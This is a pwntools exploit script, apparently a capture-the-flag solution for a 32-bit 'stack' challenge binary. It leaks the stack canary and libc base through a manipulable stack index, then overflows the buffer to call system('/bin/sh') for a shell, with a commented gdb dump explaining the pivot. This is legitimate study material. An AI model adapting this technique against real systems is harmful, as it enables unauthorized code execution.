from pwn import *
import sys
import ctypes


# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i)
        for i in __import__("subprocess")
        .check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


if len(sys.argv) == 1:
    r = process("./stack_patched")
    if args.GDB:
        gdb.attach(
            r, "b *(main+444)\nb execve\nset follow-fork-mode parent\nb do_system"
        )
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
"""
Stack structure:
    int cnt; // index of stack top
    int stack[64];
we can hijack the cnt to any value to forge the current top of stack to achieve arbitrary read
After that we can use stack overflow to control eip.
"""


def leak_stack(n):
    r.sendlineafter(b"Cmd >>\n", b"c")
    r.sendlineafter(b"Cmd >>\n", b"p")
    r.recvuntil(b"Pop -> ")
    r.sendlineafter(b"Cmd >>\n", ("i {}".format(str(n))).encode())
    r.sendlineafter(b"Cmd >>\n", b"p")
    r.recvuntil(b"Pop -> ")
    res = r.recvuntil(b"\n").replace(b"\n", b"")
    # print(res)
    res = ctypes.c_uint32(int(res.decode())).value & 0xFFFFFFFF
    return res


log.info(
    "Notice that sometimes (not very often) the stack canary will fail if there's a \"special\" character and maybe scanf won't accept it.\nAnd maybe some other reason it just crashes. Just try to run the exploit again."
)
# for i in range(100):
#     print(str(i) + ": " + hex(leak_stack(i)))
canary = leak_stack(81)
log.success("canary: " + hex(canary))
libc = leak_stack(89) - 0x18637
log.success("libc: " + hex(libc))
pointing_to_system = leak_stack(83) - 0xC4
log.success("pointing_to_system: " + hex(pointing_to_system))
system = libc + 241024
log.success("system: " + hex(system))
bin_sh = libc + 0x15BA3F
log.success('"/bin/sh": ' + hex(bin_sh))
# Don't ask, this payload is all about magic.
r.sendlineafter(
    b"Cmd >>\n",
    b"x"
    + cyclic(63)
    + p32(canary)
    + p32(system)
    + p32(0xDEADBEEF)
    + p32(bin_sh)
    + p32(pointing_to_system + 4),
)

"""
Unlike normal stack overflow, the function ends with lea  esp, [ecx - 4]; ret; instead of leave; ret;
And ret = pop eip. Therefore we need to control esp to somewhere "pointing" to system.
At main+464 we can actually control ecx, so we can control esp! (Maybe a coincidence?)
 EAX  0x0
 EBX  0xdeadbeef
 ECX  0x2a902d84 (system+4) ◂— 0xe8102444
 EDX  0x0
 EDI  0x2aa23a3f ◂— 0x6e69622f /* '/bin/sh' */
 ESI  0x2aa7a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x0
*ESP  0x2a902d80 (system) ◂— 0x8b0cec83
*EIP  0x56555916 (main+471) ◂— 0x24048bc3
─────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────────
   0x5655590f <main+464>    pop    ecx
   0x56555910 <main+465>    pop    ebx
   0x56555911 <main+466>    pop    edi
   0x56555912 <main+467>    pop    ebp
   0x56555913 <main+468>    lea    esp, [ecx - 4]
 ► 0x56555916 <main+471>    ret    <0x8b0cec83>





──────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0x2a902d80 (system) ◂— 0x8b0cec83
01:0004│ ecx 0x2a902d84 (system+4) ◂— 0xe8102444
02:0008│     0x2a902d88 (system+8) ◂— 0xe4e41
03:000c│     0x2a902d8c (system+12) ◂— 0x7274c281
04:0010│     0x2a902d90 (system+16) ◂— 0xc0850017
05:0014│     0x2a902d94 (system+20) ◂— 0xc4830a74
06:0018│     0x2a902d98 (system+24) ◂— 0xfa92e90c
07:001c│     0x2a902d9c (system+28) ◂— 0x9066ffff
────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0 0x56555916 main+471
   1 0x8b0cec83

"""
r.recvuntil(b"Bye\n")
log.success("Shell out.")
r.interactive()
